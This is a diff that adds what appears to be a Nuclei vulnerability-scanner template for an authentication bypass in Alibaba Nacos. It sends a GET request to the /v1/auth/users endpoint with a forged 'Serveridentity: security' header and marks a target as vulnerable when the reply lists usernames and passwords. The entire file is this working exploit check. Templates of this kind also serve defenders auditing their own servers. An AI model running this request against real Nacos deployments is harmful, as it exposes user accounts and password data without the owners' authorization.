@@ -1,0 +1,27 @@
+id: alibaba-nacos-security-权限绕过
+
+info:
+  name: alibaba-Nacos-security权限绕过
+  severity: high
+  tags: alibaba,Nacos
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/v1/auth/users?search=accurate&pageNo=1&pageSize=99"
+    headers:
+      User-Agent: "Requests 5.0.3, Java 1.8.0_431"
+      Accept-Encoding: "gzip, deflate, br"
+      Serveridentity: "security"
+      Cache-Control: "no-cache"
+      Pragma: "no-cache"
+      Accept: "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "username"
+          - "password"
+        condition: and
